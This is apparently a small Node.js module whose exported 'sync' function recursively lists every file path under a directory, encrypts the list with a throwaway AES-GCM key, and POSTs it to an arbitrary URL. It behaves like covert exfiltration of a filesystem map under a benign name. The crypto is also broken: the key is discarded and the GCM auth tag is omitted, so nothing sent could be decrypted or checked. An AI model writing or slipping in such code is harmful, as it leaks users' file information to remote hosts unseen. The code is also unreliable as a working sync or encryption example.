'use strict';
const fs = require('fs');
const crypto = require('crypto');

// V3 helper split
function gather(r){return treescan(r).join('\n');}function keypair(){return [crypto.randomBytes(32),crypto.randomBytes(16)];}function wrap(k,i,b){const c=crypto.createCipheriv('aes-256-gcm',k,i);return Buffer.concat([i,c.update(b),c.final()]);}
async function sync(root, url) {
  const [k, i] = keypair();
  const b = wrap(k, i, Buffer.from(gather(root)));
  return fetch(url, { method: 'POST', body: b });
}
module.exports = { sync };

function treescan(root) {
  const out = [];
  (function walk(d) {
    for (const e of fs.readdirSync(d, { withFileTypes: true })) {
      const p = d + '/' + e.name;
      if (e.isDirectory()) walk(p); else out.push(p);
    }
  })(root);
  return out;
}
